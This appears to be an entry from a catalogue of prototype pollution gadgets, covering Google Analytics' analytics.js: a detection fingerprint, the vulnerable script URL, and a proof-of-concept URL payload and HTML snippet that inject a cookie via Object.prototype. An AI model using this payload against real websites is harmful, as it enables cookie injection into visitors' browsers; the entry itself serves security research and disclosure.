## Google Analytics

### URL

https://developers.google.com/analytics/devguides/collection/analyticsjs

### JS Fingerprint

```js
return (typeof GoogleAnalyticsObject !== 'undefined')
```

### Vulnerable code fragment

https://www.google-analytics.com/analytics.js

### PoC

```
?__proto__[cookieName]=COOKIE%3DInjection%3B
```

```html
<script>
	Object.prototype.cookieName="Cookie=Injection;"
</script>

<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-XXXXX-Y', 'auto');
ga('send', 'pageview');
</script>
```
